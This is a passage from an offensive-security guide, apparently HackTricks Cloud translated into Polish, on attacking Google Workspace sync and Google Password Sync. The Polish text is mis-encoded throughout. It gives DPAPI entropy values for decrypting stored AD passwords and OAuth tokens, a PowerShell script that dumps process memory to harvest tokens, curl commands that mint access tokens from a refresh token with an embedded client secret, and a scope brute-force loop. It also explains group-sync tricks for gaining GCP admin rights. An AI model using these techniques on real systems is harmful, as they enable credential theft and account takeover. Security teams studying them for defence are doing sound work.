Musisz r√≥wnie≈º najpierw ustaliƒá, kt√≥re grupy sƒÖ synchronizowane. Chocia≈º istnieje mo≈ºliwo≈õƒá, ≈ºe **WSZYSTKIE** grupy sƒÖ synchronizowane (poniewa≈º Workspace na to pozwala).

{% hint style="info" %}
Zauwa≈º, ≈ºe nawet je≈õli grupy i cz≈Çonkostwa sƒÖ importowane do Workspace, **u≈ºytkownicy, kt√≥rzy nie sƒÖ synchronizowani w synchronizacji u≈ºytkownik√≥w, nie bƒôdƒÖ tworzeni** podczas synchronizacji grup, nawet je≈õli sƒÖ cz≈Çonkami kt√≥rejkolwiek z synchronizowanych grup.
{% endhint %}

Je≈õli wiesz, kt√≥re grupy z Azure majƒÖ **przydzielone uprawnienia w Workspace lub GCP**, mo≈ºesz po prostu dodaƒá skompromitowanego u≈ºytkownika (lub nowo utworzonego) do tej grupy i uzyskaƒá te uprawnienia.

Istnieje r√≥wnie≈º inna opcja nadu≈ºycia istniejƒÖcych uprzywilejowanych grup w Workspace. Na przyk≈Çad grupa `gcp-organization-admins@<workspace.email>` zazwyczaj ma wysokie uprawnienia w GCP.

Je≈õli synchronizacja z, na przyk≈Çad, EntraID do Workspace jest **skonfigurowana do zastƒÖpienia domeny** importowanego obiektu **emailem Workspace**, mo≈ºliwe bƒôdzie dla atakujƒÖcego utworzenie grupy `gcp-organization-admins@<entraid.email>` w EntraID, dodanie u≈ºytkownika do tej grupy i czekanie, a≈º synchronizacja wszystkich grup nastƒÖpi.\
**U≈ºytkownik zostanie dodany do grupy `gcp-organization-admins@<workspace.email>`, eskalujƒÖc uprawnienia w GCP.**

### Z Google Workspace -> AD/EntraID

Zauwa≈º, ≈ºe Workspace wymaga po≈õwiadcze≈Ñ z dostƒôpem tylko do odczytu w AD lub EntraID, aby synchronizowaƒá u≈ºytkownik√≥w i grupy. Dlatego nie jest mo≈ºliwe nadu≈ºycie Google Workspace do wprowadzenia jakichkolwiek zmian w AD lub EntraID. Tak wiƒôc **to nie jest mo≈ºliwe** w tym momencie.

Nie wiem r√≥wnie≈º, gdzie Google przechowuje po≈õwiadczenia AD lub token EntraID i **nie mo≈ºesz ich odzyskaƒá, rekonfigurujƒÖc synchronizacjƒô** (nie pojawiajƒÖ siƒô w formularzu internetowym, musisz je podaƒá ponownie). Jednak z sieci mo≈ºe byƒá mo≈ºliwe nadu≈ºycie obecnej funkcjonalno≈õci do **wylistowania u≈ºytkownik√≥w i grup**.

## GPS - Synchronizacja hase≈Ç Google

To jest binarny plik i us≈Çuga, kt√≥rƒÖ Google oferuje w celu **utrzymania synchronizacji hase≈Ç u≈ºytkownik√≥w miƒôdzy AD** a Workspace. Za ka≈ºdym razem, gdy u≈ºytkownik zmienia swoje has≈Ço w AD, jest ono ustawiane w Google.

Instaluje siƒô w `C:\Program Files\Google\Password Sync`, gdzie mo≈ºna znale≈∫ƒá binarny plik `PasswordSync.exe` do jego konfiguracji oraz `password_sync_service.exe` (us≈Çuga, kt√≥ra bƒôdzie nadal dzia≈Çaƒá).

### GPS - Konfiguracja

Aby skonfigurowaƒá ten plik binarny (i us≈Çugƒô), musisz **daƒá mu dostƒôp do Super Admina w Workspace**:

* Zaloguj siƒô za pomocƒÖ **OAuth** z Google, a nastƒôpnie **zapisze token w rejestrze (szyfrowany)**
* Dostƒôpne tylko w kontrolerach domeny z GUI
* Podanie niekt√≥rych **po≈õwiadcze≈Ñ konta us≈Çugi z GCP** (plik json) z uprawnieniami do **zarzƒÖdzania u≈ºytkownikami Workspace**
* Bardzo z≈Çy pomys≈Ç, poniewa≈º te po≈õwiadczenia nigdy nie wygasajƒÖ i mogƒÖ byƒá nadu≈ºywane
* Bardzo z≈Çy pomys≈Ç, aby daƒá SA dostƒôp do Workspace, poniewa≈º SA mo≈ºe zostaƒá skompromitowane w GCP i bƒôdzie mo≈ºliwe przej≈õcie do Workspace
* Google wymaga tego dla kontrolowanych domen bez GUI
* Te po≈õwiadczenia sƒÖ r√≥wnie≈º przechowywane w rejestrze

Je≈õli chodzi o AD, mo≈ºliwe jest wskazanie, aby u≈ºywa≈Ço aktualnego **kontekstu aplikacji, anonimowego lub niekt√≥rych konkretnych po≈õwiadcze≈Ñ**. Je≈õli opcja po≈õwiadcze≈Ñ jest wybrana, **nazwa u≈ºytkownika** jest przechowywana w pliku na **dysku**, a **has≈Ço** jest **szyfrowane** i przechowywane w **rejestrze**.

### GPS - Zrzut has≈Ça i tokenu z dysku

{% hint style="success" %}
Zauwa≈º, ≈ºe [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) jest w stanie wykryƒá **GPS**, uzyskaƒá informacje o konfiguracji i **nawet odszyfrowaƒá has≈Ço i token**.
{% endhint %}

W pliku **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** mo≈ºna znale≈∫ƒá czƒô≈õƒá konfiguracji, takƒÖ jak **`baseDN`** skonfigurowanego AD oraz **`username`**, kt√≥rych po≈õwiadczenia sƒÖ u≈ºywane.

W rejestrze **`HKLM\Software\Google\Google Apps Password Sync`** mo≈ºna znale≈∫ƒá **szyfrowany token od≈õwie≈ºania** oraz **szyfrowane has≈Ço** dla u≈ºytkownika AD (je≈õli istnieje). Ponadto, je≈õli zamiast tokenu u≈ºywane sƒÖ jakie≈õ **po≈õwiadczenia SA**, r√≥wnie≈º mo≈ºna je znale≈∫ƒá w tym adresie rejestru w formie szyfrowanej. **Warto≈õci** w tym rejestrze sƒÖ dostƒôpne tylko dla **Administrator√≥w**.

Szyfrowane **has≈Ço** (je≈õli istnieje) znajduje siƒô w kluczu **`ADPassword`** i jest szyfrowane za pomocƒÖ API **`CryptProtectData`**. Aby je odszyfrowaƒá, musisz byƒá tym samym u≈ºytkownikiem, kt√≥ry skonfigurowa≈Ç synchronizacjƒô hase≈Ç i u≈ºyƒá tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Szyfrowany token (je≈õli istnieje) znajduje siƒô w kluczu **`AuthToken`** i jest szyfrowany za pomocƒÖ API **`CryptProtectData`**. Aby go odszyfrowaƒá, musisz byƒá tym samym u≈ºytkownikiem, kt√≥ry skonfigurowa≈Ç synchronizacjƒô hase≈Ç i u≈ºyƒá tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Ponadto jest on r√≥wnie≈º kodowany za pomocƒÖ base32hex z u≈ºyciem s≈Çownika **`0123456789abcdefghijklmnopqrstv`**.

Warto≈õci entropii zosta≈Çy znalezione przy u≈ºyciu narzƒôdzia. Zosta≈Ço ono skonfigurowane do monitorowania wywo≈Ça≈Ñ do **`CryptUnprotectData`** i **`CryptProtectData`**, a nastƒôpnie narzƒôdzie zosta≈Ço u≈ºyte do uruchomienia i monitorowania `PasswordSync.exe`, kt√≥re odszyfruje skonfigurowane has≈Ço i token autoryzacyjny na poczƒÖtku, a narzƒôdzie **poka≈ºe warto≈õci dla u≈ºytej entropii** w obu przypadkach:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Zauwa≈º, ≈ºe mo≈ºliwe jest r√≥wnie≈º zobaczenie **odszyfrowanych** warto≈õci w wej≈õciu lub wyj≈õciu wywo≈Ça≈Ñ do tych API (w przypadku, gdy w pewnym momencie Winpeas przestanie dzia≈Çaƒá).

W przypadku, gdy synchronizacja hase≈Ç zosta≈Ça **skonfigurowana z po≈õwiadczeniami SA**, r√≥wnie≈º bƒôdzie to przechowywane w kluczach w rejestrze **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Zrzut token√≥w z pamiƒôci

Podobnie jak w przypadku GCPW, mo≈ºliwe jest zrzucenie pamiƒôci procesu `PasswordSync.exe` oraz proces√≥w `password_sync_service.exe`, a bƒôdziesz w stanie znale≈∫ƒá tokeny od≈õwie≈ºania i dostƒôpu (je≈õli zosta≈Çy ju≈º wygenerowane).\
My≈õlƒô, ≈ºe mo≈ºesz r√≥wnie≈º znale≈∫ƒá skonfigurowane po≈õwiadczenia AD.

<details>

<summary>Zrzut <code>PasswordSync.exe</code> i proces√≥w <code>password_sync_service.exe</code> oraz wyszukiwanie token√≥w</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generowanie token√≥w dostƒôpu z token√≥w od≈õwie≈ºajƒÖcych

U≈ºywajƒÖc tokena od≈õwie≈ºajƒÖcego, mo≈ºliwe jest generowanie token√≥w dostƒôpu przy u≈ºyciu go oraz identyfikatora klienta i tajnego klucza klienta okre≈õlonych w nastƒôpujƒÖcym poleceniu:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Zakresy

{% hint style="info" %}
Zauwa≈º, ≈ºe nawet posiadajƒÖc token od≈õwie≈ºajƒÖcy, nie mo≈ºna ≈ºƒÖdaƒá ≈ºadnego zakresu dla tokena dostƒôpu, poniewa≈º mo≈ºna ≈ºƒÖdaƒá tylko **zakres√≥w obs≈Çugiwanych przez aplikacjƒô, w kt√≥rej generujesz token dostƒôpu**.

Ponadto, token od≈õwie≈ºajƒÖcy nie jest wa≈ºny w ka≈ºdej aplikacji.
{% endhint %}

Domy≈õlnie GPS nie bƒôdzie mia≈Ç dostƒôpu jako u≈ºytkownik do ka≈ºdego mo≈ºliwego zakresu OAuth, wiƒôc u≈ºywajƒÖc poni≈ºszego skryptu mo≈ºemy znale≈∫ƒá zakresy, kt√≥re mo≈ºna wykorzystaƒá z `refresh_token`, aby wygenerowaƒá `access_token`:

<details>

<summary>Skrypt Bash do brute-force zakres√≥w</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

A oto wynik, kt√≥ry otrzyma≈Çem w momencie pisania:
```
https://www.googleapis.com/auth/admin.directory.user
```
Kt√≥ry jest taki sam, jak ten, kt√≥ry otrzymujesz, je≈õli nie wska≈ºesz ≈ºadnego zakresu.

{% hint style="danger" %}
Z tym zakresem mo≈ºesz **zmodyfikowaƒá has≈Ço istniejƒÖcego u≈ºytkownika, aby zwiƒôkszyƒá uprawnienia**.
{% endhint %}

## Odniesienia

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Ucz siƒô i ƒáwicz Hacking AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siƒô i ƒáwicz Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd≈∫ [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siƒô trikami hackingowymi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>
{% endhint %}
